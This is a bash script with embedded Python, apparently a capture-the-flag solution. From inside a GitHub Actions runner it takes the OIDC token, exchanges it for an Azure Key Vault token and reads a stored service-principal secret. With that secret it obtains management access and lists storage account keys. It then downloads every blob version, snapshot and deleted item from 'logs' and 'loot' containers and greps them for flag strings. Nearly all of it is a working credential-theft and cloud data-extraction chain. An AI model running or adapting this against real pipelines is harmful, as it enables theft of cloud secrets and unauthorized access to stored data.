#!/usr/bin/env bash
set -uo pipefail
python3 - <<'PYEOF'
import os, json, urllib.request, urllib.parse
def http(url, data=None, headers=None, method=None):
    h=dict(headers or {}); body=None
    if isinstance(data, dict):
        body=urllib.parse.urlencode(data).encode(); h.setdefault("Content-Type","application/x-www-form-urlencoded")
    elif data==b"": body=b""; h.setdefault("Content-Length","0")
    req=urllib.request.Request(url, data=body, headers=h, method=method)
    try:
        with urllib.request.urlopen(req, timeout=40) as r: return r.status, r.read()
    except urllib.error.HTTPError as e: return e.code, e.read()
    except Exception as e: return 0, str(e).encode()
def jg(b):
    try: return json.loads(b)
    except Exception: return {}
TEN=os.environ["AZURE_TENANT_ID"]; CID=os.environ["AZURE_CLIENT_ID"]; SUB=os.environ["AZURE_SUBSCRIPTION_ID"]
st,b=http(os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"]+"&audience=api://AzureADTokenExchange",
          headers={"Authorization":"bearer "+os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]})
IDT=json.loads(b)["value"]
st,b=http(f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",{"client_id":CID,
  "scope":"https://vault.azure.net/.default","grant_type":"client_credentials",
  "client_assertion_type":"urn:ietf:params:oauth:client-assertion-type:jwt-bearer","client_assertion":IDT})
KVT=jg(b)["access_token"]
st,b=http("https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/sync-service-principal?api-version=7.4",
          headers={"Authorization":"Bearer "+KVT})
c=json.loads(jg(b)["value"])
st,b=http(f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",
  {"client_id":c["appId"],"client_secret":c["clientSecret"],
   "scope":"https://management.azure.com/.default","grant_type":"client_credentials"})
ARM=jg(b)["access_token"]
st,b=http(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/rg-tbl-platform-prod-sea/"
          f"providers/Microsoft.Storage/storageAccounts/sttblcilogsprodx3euoz/listKeys?api-version=2023-01-01",
          data=b"", headers={"Authorization":"Bearer "+ARM}, method="POST")
open("/tmp/stkey","w").write(jg(b)["keys"][0]["value"])
PYEOF

KEY=$(cat /tmp/stkey); ACCT=sttblcilogsprodx3euoz
CS="DefaultEndpointsProtocol=https;AccountName=$ACCT;AccountKey=$KEY;EndpointSuffix=core.windows.net"

echo "### blob service properties (versioning / soft delete)"
az storage account blob-service-properties show --account-name "$ACCT" -g rg-tbl-platform-prod-sea \
   --query "{versioning:isVersioningEnabled,delRetention:deleteRetentionPolicy,containerDel:containerDeleteRetentionPolicy}" -o json 2>&1 | head -20

for C in logs loot; do
  echo
  echo "### container $C : ALL (versions + snapshots + deleted + metadata)"
  az storage blob list -c "$C" --connection-string "$CS" --include dvs \
     --query "[].{n:name,ver:versionId,snap:snapshot,del:deleted,size:properties.contentLength}" -o tsv 2>&1 | head -60
done

echo
echo "### deleted containers"
az storage container list --connection-string "$CS" --include-deleted --query "[].{n:name,del:deleted,ver:version}" -o tsv 2>&1 | head -20

echo
echo "### download every version/snapshot and grep"
mkdir -p /tmp/all
for C in logs loot; do
  az storage blob list -c "$C" --connection-string "$CS" --include dvs --query "[].[name,versionId]" -o tsv 2>/dev/null | \
  while IFS=$'\t' read -r N V; do
    [ -z "$N" ] && continue
    F="/tmp/all/$(echo "${C}_${N}_${V}" | tr '/:.' '___')"
    if [ "$V" = "None" ] || [ -z "$V" ]; then
      az storage blob download -c "$C" -n "$N" --connection-string "$CS" -f "$F" --overwrite -o none 2>/dev/null
    else
      az storage blob download -c "$C" -n "$N" --version-id "$V" --connection-string "$CS" -f "$F" --overwrite -o none 2>/dev/null
    fi
  done
done
ls -la /tmp/all | head -30
echo "--- grep"
grep -raoiE '(DF26|flag|CTF|cyberjutsu)\{[^}]{0,250}\}' /tmp/all 2>/dev/null | sort -u | head -20
rm -f /tmp/stkey
echo "=== done ==="